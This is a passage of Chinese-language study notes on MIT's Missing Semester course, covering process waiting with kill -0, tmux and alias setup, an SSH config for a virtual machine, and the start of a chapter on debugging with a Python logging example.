<p>2.Say you don’t want to start a process until another completes. How would you go about it? In this exercise, our limiting process will always be <code>sleep 60 &amp;</code>. One way to achieve this is to use the <code>wait</code> command. Try launching the <code>sleep</code> command and having an <code>ls</code> wait until the background process finishes.</p>
<p>However, this strategy will fail if we start in a different bash session, since <code>wait</code> only works for child processes. One feature we did not discuss in the notes is that the <code>kill</code> command’s exit status will be zero on success and nonzero otherwise. <code>kill -0</code> does not send a signal but will give a nonzero exit status if the process does not exist. Write a bash function called <code>pidwait</code> that takes a pid and waits until the given process completes. You should use <code>sleep</code> to avoid wasting CPU unnecessarily.</p>
<p>即我们想要在另一个进程完成之后再启动一个进程，我们可以使用<code>wait</code>命令。
例如我们想要在<code>sleep 60 &amp;</code>完成之后再启动<code>ls</code>，我们可以使用<code>wait</code>命令。</p>
<div class="language-bash highlight"><pre><span></span><code><span id="__span-22-1"><a id="__codelineno-22-1" name="__codelineno-22-1" href="#note-cs-tms-command-line-environment-__codelineno-22-1"></a>sleep<span class="w"> </span><span class="m">60</span><span class="w"> </span><span class="p">&amp;</span>
</span><span id="__span-22-2"><a id="__codelineno-22-2" name="__codelineno-22-2" href="#note-cs-tms-command-line-environment-__codelineno-22-2"></a><span class="nb">wait</span><span class="w"> </span>%1
</span><span id="__span-22-3"><a id="__codelineno-22-3" name="__codelineno-22-3" href="#note-cs-tms-command-line-environment-__codelineno-22-3"></a>ls
</span></code></pre></div>
<p>但是<code>wait</code>命令只适用于子进程，所以如果我们在不同的bash session中启动进程，这个方法就会失败。</p>
<p>一个课上没有讨论的特性是<code>kill</code>命令的退出状态，当成功时为0，否则为非0。<code>kill -0</code>不会发送信号，但当进程不存在时会返回非0的退出状态。</p>
<p>所以我们可以使用<code>kill -0</code>来检查进程是否存在，如果存在则等待，否则直接执行。</p>
<p><div class="language-bash highlight"><pre><span></span><code><span id="__span-23-1"><a id="__codelineno-23-1" name="__codelineno-23-1" href="#note-cs-tms-command-line-environment-__codelineno-23-1"></a>pidwait<span class="o">()</span><span class="w"> </span><span class="o">{</span>
</span><span id="__span-23-2"><a id="__codelineno-23-2" name="__codelineno-23-2" href="#note-cs-tms-command-line-environment-__codelineno-23-2"></a><span class="w">    </span><span class="k">while</span><span class="w"> </span><span class="nb">kill</span><span class="w"> </span>-0<span class="w"> </span><span class="nv">$1</span><span class="w"> </span>&gt;<span class="w"> </span>/dev/null<span class="w"> </span><span class="m">2</span>&gt;<span class="p">&amp;</span><span class="m">1</span><span class="p">;</span><span class="w"> </span><span class="k">do</span>
</span><span id="__span-23-3"><a id="__codelineno-23-3" name="__codelineno-23-3" href="#note-cs-tms-command-line-environment-__codelineno-23-3"></a><span class="w">        </span>sleep<span class="w"> </span><span class="m">1</span>
</span><span id="__span-23-4"><a id="__codelineno-23-4" name="__codelineno-23-4" href="#note-cs-tms-command-line-environment-__codelineno-23-4"></a><span class="w">    </span><span class="k">done</span>
</span><span id="__span-23-5"><a id="__codelineno-23-5" name="__codelineno-23-5" href="#note-cs-tms-command-line-environment-__codelineno-23-5"></a><span class="w">    </span>ls
</span><span id="__span-23-6"><a id="__codelineno-23-6" name="__codelineno-23-6" href="#note-cs-tms-command-line-environment-__codelineno-23-6"></a><span class="o">}</span>
</span></code></pre></div>
将标准错误重定向到与标准输出相同的地方，即<code>2&gt;&amp;1</code>。</p>
<figure>
<img alt="" src="../NOTE/CS/TMS/img/lec4-7.png" width="350" />

<figcaption>过程</figcaption>
</figure>
<h3 id="note-cs-tms-command-line-environment-terminal-multiplexer_1">Terminal multiplexer<a class="headerlink" href="#note-cs-tms-command-line-environment-terminal-multiplexer_1" title="Permanent link">&para;</a></h3>
<p>Follow this <a href="https://hamvocke.com/blog/a-quick-and-easy-guide-to-tmux/">tmux tutorial</a> and then learn how to do some basic customizations following <a href="https://hamvocke.com/blog/a-guide-to-customizing-your-tmux-conf/">these steps</a>.</p>
<p>配置的话我只把<code>Ctrl+B</code>改成了<code>Ctrl+A</code></p>
<p>水平分割从<code>"</code>改成了<code>-</code></p>
<p>垂直分割从<code>%</code>改成了<code>|</code></p>
<p>配置完后重启tmux命令即可生效</p>
<h3 id="note-cs-tms-command-line-environment-aliases">Aliases<a class="headerlink" href="#note-cs-tms-command-line-environment-aliases" title="Permanent link">&para;</a></h3>
<p>1.Create an alias dc that resolves to cd for when you type it wrongly.</p>
<p>即创建一个别名<code>dc</code>，当输入<code>dc</code>时，会自动解析为<code>cd</code>。</p>
<div class="language-bash highlight"><pre><span></span><code><span id="__span-24-1"><a id="__codelineno-24-1" name="__codelineno-24-1" href="#note-cs-tms-command-line-environment-__codelineno-24-1"></a><span class="nb">alias</span><span class="w"> </span><span class="nv">dc</span><span class="o">=</span><span class="s1">&#39;cd&#39;</span>
</span></code></pre></div>
<p>2.Run <code>history | awk '{$1="";print substr($0,2)}' | sort | uniq -c | sort -n | tail -n 10</code> to get your top 10 most used commands and consider writing shorter aliases for them. Note: this works for Bash; if you’re using ZSH, use history 1 instead of just history.</p>
<p>即获取你最常用的10个命令，并考虑为它们写更短的别名。</p>
<p>我最主要用的是</p>
<div class="language-bash highlight"><pre><span></span><code><span id="__span-25-1"><a id="__codelineno-25-1" name="__codelineno-25-1" href="#note-cs-tms-command-line-environment-__codelineno-25-1"></a>mkdocs<span class="w"> </span>serve
</span><span id="__span-25-2"><a id="__codelineno-25-2" name="__codelineno-25-2" href="#note-cs-tms-command-line-environment-__codelineno-25-2"></a>mkdocs<span class="w"> </span>gh-deploy
</span></code></pre></div>
<p>我想把它简写为</p>
<p><div class="language-bash highlight"><pre><span></span><code><span id="__span-26-1"><a id="__codelineno-26-1" name="__codelineno-26-1" href="#note-cs-tms-command-line-environment-__codelineno-26-1"></a><span class="nb">alias</span><span class="w"> </span><span class="nv">mkds</span><span class="o">=</span><span class="s1">&#39;mkdocs serve&#39;</span>
</span><span id="__span-26-2"><a id="__codelineno-26-2" name="__codelineno-26-2" href="#note-cs-tms-command-line-environment-__codelineno-26-2"></a><span class="nb">alias</span><span class="w"> </span><span class="nv">mkdgh</span><span class="o">=</span><span class="s1">&#39;mkdocs gh-deploy&#39;</span>
</span></code></pre></div>
放在了我的<code>~/.zshrc</code>文件中。</p>
<p>Dotfiles的习题主要是给配置添加软连接到本地的文件,不做赘述</p>
<h3 id="note-cs-tms-command-line-environment-remote-machines_1">Remote machines<a class="headerlink" href="#note-cs-tms-command-line-environment-remote-machines_1" title="Permanent link">&para;</a></h3>
<p>Install a Linux virtual machine (or use an already existing one) for this exercise. If you are not familiar with virtual machines check out this tutorial for installing one.</p>
<p>即安装一个Linux虚拟机(或使用已有的虚拟机)，如果对虚拟机不熟悉，可以参考这个教程<a href="https://hibbard.eu/install-ubuntu-virtual-box/">Installing a virtual machine</a>。</p>
<p>其实我之前一直都搞不懂ssh的配置文件，做完这道题简直是大彻大悟了。</p>
<p>现在，我有一台windows电脑，安装了linux虚拟机;现在我想要直接通过<code>ssh vm</code>连接到虚拟机.</p>
<p>首先，在windows的<code>~/.ssh</code>文件夹下创建一个<code>config</code>文件，添加以下内容：</p>
<div class="language-bash highlight"><pre><span></span><code><span id="__span-27-1"><a id="__codelineno-27-1" name="__codelineno-27-1" href="#note-cs-tms-command-line-environment-__codelineno-27-1"></a><span class="w"> </span>Host<span class="w"> </span>vm
</span><span id="__span-27-2"><a id="__codelineno-27-2" name="__codelineno-27-2" href="#note-cs-tms-command-line-environment-__codelineno-27-2"></a><span class="w">     </span>User<span class="w"> </span>username_goes_here
</span><span id="__span-27-3"><a id="__codelineno-27-3" name="__codelineno-27-3" href="#note-cs-tms-command-line-environment-__codelineno-27-3"></a><span class="w">     </span>HostName<span class="w"> </span>ip_goes_here
</span><span id="__span-27-4"><a id="__codelineno-27-4" name="__codelineno-27-4" href="#note-cs-tms-command-line-environment-__codelineno-27-4"></a><span class="w">     </span>IdentityFile<span class="w"> </span>~/.ssh/id_xxxx
</span><span id="__span-27-5"><a id="__codelineno-27-5" name="__codelineno-27-5" href="#note-cs-tms-command-line-environment-__codelineno-27-5"></a><span class="w">     </span>LocalForward<span class="w"> </span><span class="m">9999</span><span class="w"> </span>localhost:8888
</span></code></pre></div>
<p>这里的Host就是远端机器，在这里就是我的虚拟机。</p>
<p>User就是我的用户名，注意这个用户名在虚拟机中必须要存在。</p>
<p>HostName就是我的虚拟机的ip地址</p>
<p>IdentityFile就是我的私钥文件，在这里就是我的私钥文件。</p>
<p>然后在Windows中通过<code>ssh-copy-id vm</code>将我的公钥复制到虚拟机中。</p>
<blockquote>
<p>如果powershell中没有<code>ssh-copy-id</code>，可以直接去虚拟机中将对应的公钥内容添加到<code>~/.ssh/authorized_keys</code>文件中。</p>
</blockquote>
<p>然后就大功告成了，现在就可以直接通过<code>ssh vm</code>连接到虚拟机了。</p></section><section class="print-page" id="note-cs-tms-debugging-and-profiling" heading-number="2.4.2.6"><h1 id="note-cs-tms-debugging-and-profiling-_1">调试与性能分析<a class="headerlink" href="#note-cs-tms-debugging-and-profiling-_1" title="Permanent link">&para;</a></h1>
<div style="margin-top: -30px; font-size: 0.75em; opacity: 0.7;">
<p><span class="twemoji"><svg xmlns="http://www.w3.org/2000/svg" viewBox="0 0 24 24"><path d="M12 2A10 10 0 0 0 2 12a10 10 0 0 0 10 10 10 10 0 0 0 10-10h-2a8 8 0 0 1-8 8 8 8 0 0 1-8-8 8 8 0 0 1 8-8zm6.78 1a.7.7 0 0 0-.48.2l-1.22 1.21 2.5 2.5L20.8 5.7c.26-.26.26-.7 0-.95L19.25 3.2c-.13-.13-.3-.2-.47-.2m-2.41 2.12L9 12.5V15h2.5l7.37-7.38z"/></svg></span> 约 3960 个字 <span class="twemoji"><svg xmlns="http://www.w3.org/2000/svg" viewBox="0 0 640 512"><!--! Font Awesome Free 6.7.2 by @fontawesome - https://fontawesome.com License - https://fontawesome.com/license/free (Icons: CC BY 4.0, Fonts: SIL OFL 1.1, Code: MIT License) Copyright 2024 Fonticons, Inc.--><path d="M392.8 1.2c-17-4.9-34.7 5-39.6 22l-128 448c-4.9 17 5 34.7 22 39.6s34.7-5 39.6-22l128-448c4.9-17-5-34.7-22-39.6m80.6 120.1c-12.5 12.5-12.5 32.8 0 45.3l89.3 89.4-89.4 89.4c-12.5 12.5-12.5 32.8 0 45.3s32.8 12.5 45.3 0l112-112c12.5-12.5 12.5-32.8 0-45.3l-112-112c-12.5-12.5-32.8-12.5-45.3 0zm-306.7 0c-12.5-12.5-32.8-12.5-45.3 0l-112 112c-12.5 12.5-12.5 32.8 0 45.3l112 112c12.5 12.5 32.8 12.5 45.3 0s12.5-32.8 0-45.3L77.3 256l89.4-89.4c12.5-12.5 12.5-32.8 0-45.3"/></svg></span> 183 行代码 <span class="twemoji"><svg xmlns="http://www.w3.org/2000/svg" viewBox="0 0 24 24"><path d="M21 17H7V3h14m0-2H7a2 2 0 0 0-2 2v14a2 2 0 0 0 2 2h14a2 2 0 0 0 2-2V3a2 2 0 0 0-2-2M3 5H1v16a2 2 0 0 0 2 2h16v-2H3m12.96-10.71-2.75 3.54-1.96-2.36L8.5 15h11z"/></svg></span> 1 张图片 <span class="twemoji"><svg xmlns="http://www.w3.org/2000/svg" viewBox="0 0 24 24"><path d="M12 20c4.42 0 8-3.58 8-8s-3.58-8-8-8-8 3.58-8 8 3.58 8 8 8m0-18c5.5 0 10 4.5 10 10s-4.5 10-10 10C6.47 22 2 17.5 2 12S6.5 2 12 2m.5 11H11V7h1.5v4.26l3.7-2.13.75 1.3z"/></svg></span> 预计阅读时间 16 分钟</p>
</div>
<p>代码不能完全按照您的想法运行，它只能完全按照您的写法运行，这是编程界的一条金科玉律。</p>
<p>这节课主要是了解一些工具，"you don't have to become a master of all these tools,just know that there exits such tools so you can use instead of doing some unnecessary works"</p>
<h2 id="note-cs-tms-debugging-and-profiling-_2">调试代码<a class="headerlink" href="#note-cs-tms-debugging-and-profiling-_2" title="Permanent link">&para;</a></h2>
<h3 id="note-cs-tms-debugging-and-profiling-_3">打印与日志<a class="headerlink" href="#note-cs-tms-debugging-and-profiling-_3" title="Permanent link">&para;</a></h3>
<p>打印调试法，即Print大法，由于其可以得到快速而直观的反馈，是大多数人十分喜爱的一种调试方法</p>
<p>另外一个方法是使用日志，而不是临时添加打印语句。日志较普通的打印语句有如下的一些优势：</p>
<ul>
<li>可以将日志写入文件、socket 或者甚至是发送到远端服务器而不仅仅是标准输出；</li>
<li>日志可以支持严重等级（例如 INFO, DEBUG, WARN, ERROR 等），这使您可以根据需要过滤日志；</li>
<li>对于新发现的问题，很可能您的日志中已经包含了可以帮助您定位问题的足够的信息。</li>
</ul>
<p>例如以下这个<code>python</code>程序</p>
<div class="language-python highlight"><pre><span></span><code><span id="__span-0-1"><a id="__codelineno-0-1" name="__codelineno-0-1" href="#note-cs-tms-debugging-and-profiling-__codelineno-0-1"></a><span class="kn">import</span> <span class="nn">logging</span>
</span><span id="__span-0-2"><a id="__codelineno-0-2" name="__codelineno-0-2" href="#note-cs-tms-debugging-and-profiling-__codelineno-0-2"></a><span class="kn">import</span> <span class="nn">sys</span>
</span><span id="__span-0-3"><a id="__codelineno-0-3" name="__codelineno-0-3" href="#note-cs-tms-debugging-and-profiling-__codelineno-0-3"></a>
</span><span id="__span-0-4"><a id="__codelineno-0-4" name="__codelineno-0-4" href="#note-cs-tms-debugging-and-profiling-__codelineno-0-4"></a><span class="k">class</span> <span class="nc">CustomFormatter</span><span class="p">(</span><span class="n">logging</span><span class="o">.</span><span class="n">Formatter</span><span class="p">):</span>
</span><span id="__span-0-5"><a id="__codelineno-0-5" name="__codelineno-0-5" href="#note-cs-tms-debugging-and-profiling-__codelineno-0-5"></a><span class="w">    </span><span class="sd">&quot;&quot;&quot;Logging Formatter to add colors and count warning / errors&quot;&quot;&quot;</span>
</span><span id="__span-0-6"><a id="__codelineno-0-6" name="__codelineno-0-6" href="#note-cs-tms-debugging-and-profiling-__codelineno-0-6"></a>
</span><span id="__span-0-7"><a id="__codelineno-0-7" name="__codelineno-0-7" href="#note-cs-tms-debugging-and-profiling-__codelineno-0-7"></a>    <span class="n">grey</span> <span class="o">=</span> <span class="s2">&quot;</span><span class="se">\x1b</span><span class="s2">[38;21m&quot;</span>
</span><span id="__span-0-8"><a id="__codelineno-0-8" name="__codelineno-0-8" href="#note-cs-tms-debugging-and-profiling-__codelineno-0-8"></a>    <span class="n">yellow</span> <span class="o">=</span> <span class="s2">&quot;</span><span class="se">\x1b</span><span class="s2">[33;21m&quot;</span>
</span><span id="__span-0-9"><a id="__codelineno-0-9" name="__codelineno-0-9" href="#note-cs-tms-debugging-and-profiling-__codelineno-0-9"></a>    <span class="n">red</span> <span class="o">=</span> <span class="s2">&quot;</span><span class="se">\x1b</span><span class="s2">[31;21m&quot;</span>
</span><span id="__span-0-10"><a id="__codelineno-0-10" name="__codelineno-0-10" href="#note-cs-tms-debugging-and-profiling-__codelineno-0-10"></a>    <span class="n">bold_red</span> <span class="o">=</span> <span class="s2">&quot;</span><span class="se">\x1b</span><span class="s2">[31;1m&quot;</span>
</span><span id="__span-0-11"><a id="__codelineno-0-11" name="__codelineno-0-11" href="#note-cs-tms-debugging-and-profiling-__codelineno-0-11"></a>    <span class="n">reset</span> <span class="o">=</span> <span class="s2">&quot;</span><span class="se">\x1b</span><span class="s2">[0m&quot;</span>
</span><span id="__span-0-12"><a id="__codelineno-0-12" name="__codelineno-0-12" href="#note-cs-tms-debugging-and-profiling-__codelineno-0-12"></a>    <span class="nb">format</span> <span class="o">=</span> <span class="s2">&quot;</span><span class="si">%(asctime)s</span><span class="s2"> - </span><span class="si">%(name)s</span><span class="s2"> - </span><span class="si">%(levelname)s</span><span class="s2"> - </span><span class="si">%(message)s</span><span class="s2"> (</span><span class="si">%(filename)s</span><span class="s2">:</span><span class="si">%(lineno)d</span><span class="s2">)&quot;</span>
</span><span id="__span-0-13"><a id="__codelineno-0-13" name="__codelineno-0-13" href="#note-cs-tms-debugging-and-profiling-__codelineno-0-13"></a>
</span><span id="__span-0-14"><a id="__codelineno-0-14" name="__codelineno-0-14" href="#note-cs-tms-debugging-and-profiling-__codelineno-0-14"></a>    <span class="n">FORMATS</span> <span class="o">=</span> <span class="p">{</span>
</span><span id="__span-0-15"><a id="__codelineno-0-15" name="__codelineno-0-15" href="#note-cs-tms-debugging-and-profiling-__codelineno-0-15"></a>        <span class="n">logging</span><span class="o">.</span><span class="n">DEBUG</span><span class="p">:</span> <span class="n">grey</span> <span class="o">+</span> <span class="nb">format</span> <span class="o">+</span> <span class="n">reset</span><span class="p">,</span>
</span><span id="__span-0-16"><a id="__codelineno-0-16" name="__codelineno-0-16" href="#note-cs-tms-debugging-and-profiling-__codelineno-0-16"></a>        <span class="n">logging</span><span class="o">.</span><span class="n">INFO</span><span class="p">:</span> <span class="n">grey</span> <span class="o">+</span> <span class="nb">format</span> <span class="o">+</span> <span class="n">reset</span><span class="p">,</span>
</span><span id="__span-0-17"><a id="__codelineno-0-17" name="__codelineno-0-17" href="#note-cs-tms-debugging-and-profiling-__codelineno-0-17"></a>        <span class="n">logging</span><span class="o">.</span><span class="n">WARNING</span><span class="p">:</span> <span class="n">yellow</span> <span class="o">+</span> <span class="nb">format</span> <span class="o">+</span> <span class="n">reset</span><span class="p">,</span>
</span><span id="__span-0-18"><a id="__codelineno-0-18" name="__codelineno-0-18" href="#note-cs-tms-debugging-and-profiling-__codelineno-0-18"></a>        <span class="n">logging</span><span class="o">.</span><span class="n">ERROR</span><span class="p">:</span> <span class="n">red</span> <span class="o">+</span> <span class="nb">format</span> <span class="o">+</span> <span class="n">reset</span><span class="p">,</span>
</span><span id="__span-0-19"><a id="__codelineno-0-19" name="__codelineno-0-19" href="#note-cs-tms-debugging-and-profiling-__codelineno-0-19"></a>        <span class="n">logging</span><span class="o">.</span><span class="n">CRITICAL</span><span class="p">:</span> <span class="n">bold_red</span> <span class="o">+</span> <span class="nb">format</span> <span class="o">+</span> <span class="n">reset</span>
</span><span id="__span-0-20"><a id="__codelineno-0-20" name="__codelineno-0-20" href="#note-cs-tms-debugging-and-profiling-__codelineno-0-20"></a>    <span class="p">}</span>
</span><span id="__span-0-21"><a id="__codelineno-0-21" name="__codelineno-0-21" href="#note-cs-tms-debugging-and-profiling-__codelineno-0-21"></a>
</span><span id="__span-0-22"><a id="__codelineno-0-22" name="__codelineno-0-22" href="#note-cs-tms-debugging-and-profiling-__codelineno-0-22"></a>    <span class="k">def</span> <span class="nf">format</span><span class="p">(</span><span class="bp">self</span><span class="p">,</span> <span class="n">record</span><span class="p">):</span>
</span><span id="__span-0-23"><a id="__codelineno-0-23" name="__codelineno-0-23" href="#note-cs-tms-debugging-and-profiling-__codelineno-0-23"></a>        <span class="n">log_fmt</span> <span class="o">=</span> <span class="bp">self</span><span class="o">.</span><span class="n">FORMATS</span><span class="o">.</span><span class="n">get</span><span class="p">(</span><span class="n">record</span><span class="o">.</span><span class="n">levelno</span><span class="p">)</span>
</span><span id="__span-0-24"><a id="__codelineno-0-24" name="__codelineno-0-24" href="#note-cs-tms-debugging-and-profiling-__codelineno-0-24"></a>        <span class="n">formatter</span> <span class="o">=</span> <span class="n">logging</span><span class="o">.</span><span class="n">Formatter</span><span class="p">(</span><span class="n">log_fmt</span><span class="p">)</span>
</span><span id="__span-0-25"><a id="__codelineno-0-25" name="__codelineno-0-25" href="#note-cs-tms-debugging-and-profiling-__codelineno-0-25"></a>        <span class="k">return</span> <span class="n">formatter</span><span class="o">.</span><span class="n">format</span><span class="p">(</span><span class="n">record</span><span class="p">)</span>
</span><span id="__span-0-26"><a id="__codelineno-0-26" name="__codelineno-0-26" href="#note-cs-tms-debugging-and-profiling-__codelineno-0-26"></a>
</span><span id="__span-0-27"><a id="__codelineno-0-27" name="__codelineno-0-27" href="#note-cs-tms-debugging-and-profiling-__codelineno-0-27"></a><span class="c1"># create logger with &#39;spam_application&#39;</span>
</span><span id="__span-0-28"><a id="__codelineno-0-28" name="__codelineno-0-28" href="#note-cs-tms-debugging-and-profiling-__codelineno-0-28"></a><span class="n">logger</span> <span class="o">=</span> <span class="n">logging</span><span class="o">.</span><span class="n">getLogger</span><span class="p">(</span><span class="s2">&quot;Sample&quot;</span><span class="p">)</span>
</span><span id="__span-0-29"><a id="__codelineno-0-29" name="__codelineno-0-29" href="#note-cs-tms-debugging-and-profiling-__codelineno-0-29"></a>
</span><span id="__span-0-30"><a id="__codelineno-0-30" name="__codelineno-0-30" href="#note-cs-tms-debugging-and-profiling-__codelineno-0-30"></a><span class="c1"># create console handler with a higher log level</span>
</span><span id="__span-0-31"><a id="__codelineno-0-31" name="__codelineno-0-31" href="#note-cs-tms-debugging-and-profiling-__codelineno-0-31"></a><span class="n">ch</span> <span class="o">=</span> <span class="n">logging</span><span class="o">.</span><span class="n">StreamHandler</span><span class="p">()</span>
</span><span id="__span-0-32"><a id="__codelineno-0-32" name="__codelineno-0-32" href="#note-cs-tms-debugging-and-profiling-__codelineno-0-32"></a><span class="n">ch</span><span class="o">.</span><span class="n">setLevel</span><span class="p">(</span><span class="n">logging</span><span class="o">.</span><span class="n">DEBUG</span><span class="p">)</span>
</span><span id="__span-0-33"><a id="__codelineno-0-33" name="__codelineno-0-33" href="#note-cs-tms-debugging-and-profiling-__codelineno-0-33"></a>
</span><span id="__span-0-34"><a id="__codelineno-0-34" name="__codelineno-0-34" href="#note-cs-tms-debugging-and-profiling-__codelineno-0-34"></a><span class="k">if</span> <span class="nb">len</span><span class="p">(</span><span class="n">sys</span><span class="o">.</span><span class="n">argv</span><span class="p">)</span><span class="o">&gt;</span> <span class="mi">1</span><span class="p">:</span>
</span><span id="__span-0-35"><a id="__codelineno-0-35" name="__codelineno-0-35" href="#note-cs-tms-debugging-and-profiling-__codelineno-0-35"></a>    <span class="k">if</span> <span class="n">sys</span><span class="o">.</span><span class="n">argv</span><span class="p">[</span><span class="mi">1</span><span class="p">]</span> <span class="o">==</span> <span class="s1">&#39;log&#39;</span><span class="p">:</span>
</span><span id="__span-0-36"><a id="__codelineno-0-36" name="__codelineno-0-36" href="#note-cs-tms-debugging-and-profiling-__codelineno-0-36"></a>        <span class="n">ch</span><span class="o">.</span><span class="n">setFormatter</span><span class="p">(</span><span class="n">logging</span><span class="o">.</span><span class="n">Formatter</span><span class="p">(</span><span class="s1">&#39;</span><span class="si">%(asctime)s</span><span class="s1"> : </span><span class="si">%(levelname)s</span><span class="s1"> : </span><span class="si">%(name)s</span><span class="s1"> : </span><span class="si">%(message)s</span><span class="s1">&#39;</span><span class="p">))</span>
</span><span id="__span-0-37"><a id="__codelineno-0-37" name="__codelineno-0-37" href="#note-cs-tms-debugging-and-profiling-__codelineno-0-37"></a>    <span class="k">elif</span> <span class="n">sys</span><span class="o">.</span><span class="n">argv</span><span class="p">[</span><span class="mi">1</span><span class="p">]</span> <span class="o">==</span> <span class="s1">&#39;color&#39;</span><span class="p">:</span>
</span><span id="__span-0-38"><a id="__codelineno-0-38" name="__codelineno-0-38" href="#note-cs-tms-debugging-and-profiling-__codelineno-0-38"></a>        <span class="n">ch</span><span class="o">.</span><span class="n">setFormatter</span><span class="p">(</span><span class="n">CustomFormatter</span><span class="p">())</span>
</span><span id="__span-0-39"><a id="__codelineno-0-39" name="__codelineno-0-39" href="#note-cs-tms-debugging-and-profiling-__codelineno-0-39"></a>
</span><span id="__span-0-40"><a id="__codelineno-0-40" name="__codelineno-0-40" href="#note-cs-tms-debugging-and-profiling-__codelineno-0-40"></a><span class="k">if</span> <span class="nb">len</span><span class="p">(</span><span class="n">sys</span><span class="o">.</span><span class="n">argv</span><span class="p">)</span> <span class="o">&gt;</span> <span class="mi">2</span><span class="p">:</span>
</span><span id="__span-0-41"><a id="__codelineno-0-41" name="__codelineno-0-41" href="#note-cs-tms-debugging-and-profiling-__codelineno-0-41"></a>    <span class="n">logger</span><span class="o">.</span><span class="n">setLevel</span><span class="p">(</span><span class="n">logging</span><span class="o">.</span><span class="fm">__getattribute__</span><span class="p">(</span><span class="n">sys</span><span class="o">.</span><span class="n">argv</span><span class="p">[</span><span class="mi">2</span><span class="p">]))</span>
</span><span id="__span-0-42"><a id="__codelineno-0-42" name="__codelineno-0-42" href="#note-cs-tms-debugging-and-profiling-__codelineno-0-42"></a><span class="k">else</span><span class="p">:</span>
</span><span id="__span-0-43"><a id="__codelineno-0-43" name="__codelineno-0-43" href="#note-cs-tms-debugging-and-profiling-__codelineno-0-43"></a>    <span class="n">logger</span><span class="o">.</span><span class="n">setLevel</span><span class="p">(</span><span class="n">logging</span><span class="o">.</span><span class="n">DEBUG</span><span class="p">)</span>
</span><span id="__span-0-44"><a id="__codelineno-0-44" name="__codelineno-0-44" href="#note-cs-tms-debugging-and-profiling-__codelineno-0-44"></a>
</span><span id="__span-0-45"><a id="__codelineno-0-45" name="__codelineno-0-45" href="#note-cs-tms-debugging-and-profiling-__codelineno-0-45"></a><span class="n">logger</span><span class="o">.</span><span class="n">addHandler</span><span class="p">(</span><span class="n">ch</span><span class="p">)</span>
</span><span id="__span-0-46"><a id="__codelineno-0-46" name="__codelineno-0-46" href="#note-cs-tms-debugging-and-profiling-__codelineno-0-46"></a>
</span><span id="__span-0-47"><a id="__codelineno-0-47" name="__codelineno-0-47" href="#note-cs-tms-debugging-and-profiling-__codelineno-0-47"></a><span class="c1"># logger.debug(&quot;debug message&quot;)</span>
</span><span id="__span-0-48"><a id="__codelineno-0-48" name="__codelineno-0-48" href="#note-cs-tms-debugging-and-profiling-__codelineno-0-48"></a><span class="c1"># logger.info(&quot;info message&quot;)</span>
</span><span id="__span-0-49"><a id="__codelineno-0-49" name="__codelineno-0-49" href="#note-cs-tms-debugging-and-profiling-__codelineno-0-49"></a><span class="c1"># logger.warning(&quot;warning message&quot;)</span>
</span><span id="__span-0-50"><a id="__codelineno-0-50" name="__codelineno-0-50" href="#note-cs-tms-debugging-and-profiling-__codelineno-0-50"></a><span class="c1"># logger.error(&quot;error message&quot;)</span>
</span><span id="__span-0-51"><a id="__codelineno-0-51" name="__codelineno-0-51" href="#note-cs-tms-debugging-and-profiling-__codelineno-0-51"></a><span class="c1"># logger.critical(&quot;critical message&quot;)</span>
</span><span id="__span-0-52"><a id="__codelineno-0-52" name="__codelineno-0-52" href="#note-cs-tms-debugging-and-profiling-__codelineno-0-52"></a>
</span><span id="__span-0-53"><a id="__codelineno-0-53" name="__codelineno-0-53" href="#note-cs-tms-debugging-and-profiling-__codelineno-0-53"></a><span class="kn">import</span> <span class="nn">random</span>
</span><span id="__span-0-54"><a id="__codelineno-0-54" name="__codelineno-0-54" href="#note-cs-tms-debugging-and-profiling-__codelineno-0-54"></a><span class="kn">import</span> <span class="nn">time</span>
</span><span id="__span-0-55"><a id="__codelineno-0-55" name="__codelineno-0-55" href="#note-cs-tms-debugging-and-profiling-__codelineno-0-55"></a><span class="k">for</span> <span class="n">_</span> <span class="ow">in</span> <span class="nb">range</span><span class="p">(</span><span class="mi">100</span><span class="p">):</span>
</span><span id="__span-0-56"><a id="__codelineno-0-56" name="__codelineno-0-56" href="#note-cs-tms-debugging-and-profiling-__codelineno-0-56"></a>    <span class="n">i</span> <span class="o">=</span> <span class="n">random</span><span class="o">.</span><span class="n">randint</span><span class="p">(</span><span class="mi">0</span><span class="p">,</span> <span class="mi">10</span><span class="p">)</span>
</span><span id="__span-0-57"><a id="__codelineno-0-57" name="__codelineno-0-57" href="#note-cs-tms-debugging-and-profiling-__codelineno-0-57"></a>    <span class="k">if</span> <span class="n">i</span> <span class="o">&lt;=</span> <span class="mi">4</span><span class="p">:</span>
</span><span id="__span-0-58"><a id="__codelineno-0-58" name="__codelineno-0-58" href="#note-cs-tms-debugging-and-profiling-__codelineno-0-58"></a>        <span class="n">logger</span><span class="o">.</span><span class="n">info</span><span class="p">(</span><span class="s2">&quot;Value is </span><span class="si">{}</span><span class="s2"> - Everything is fine&quot;</span><span class="o">.</span><span class="n">format</span><span class="p">(</span><span class="n">i</span><span class="p">))</span>
</span><span id="__span-0-59"><a id="__codelineno-0-59" name="__codelineno-0-59" href="#note-cs-tms-debugging-and-profiling-__codelineno-0-59"></a>    <span class="k">elif</span> <span class="n">i</span> <span class="o">&lt;=</span> <span class="mi">6</span><span class="p">:</span>
</span><span id="__span-0-60"><a id="__codelineno-0-60" name="__codelineno-0-60" href="#note-cs-tms-debugging-and-profiling-__codelineno-0-60"></a>        <span class="n">logger</span><span class="o">.</span><span class="n">warning</span><span class="p">(</span><span class="s2">&quot;Value is </span><span class="si">{}</span><span class="s2"> - System is getting hot&quot;</span><span class="o">.</span><span class="n">format</span><span class="p">(</span><span class="n">i</span><span class="p">))</span>
</span><span id="__span-0-61"><a id="__codelineno-0-61" name="__codelineno-0-61" href="#note-cs-tms-debugging-and-profiling-__codelineno-0-61"></a>    <span class="k">elif</span> <span class="n">i</span> <span class="o">&lt;=</span> <span class="mi">8</span><span class="p">:</span>
</span><span id="__span-0-62"><a id="__codelineno-0-62" name="__codelineno-0-62" href="#note-cs-tms-debugging-and-profiling-__codelineno-0-62"></a>        <span class="n">logger</span><span class="o">.</span><span class="n">error</span><span class="p">(</span><span class="s2">&quot;Value is </span><span class="si">{}</span><span class="s2"> - Dangerous region&quot;</span><span class="o">.</span><span class="n">format</span><span class="p">(</span><span class="n">i</span><span class="p">))</span>
</span><span id="__span-0-63"><a id="__codelineno-0-63" name="__codelineno-0-63" href="#note-cs-tms-debugging-and-profiling-__codelineno-0-63"></a>    <span class="k">else</span><span class="p">:</span>
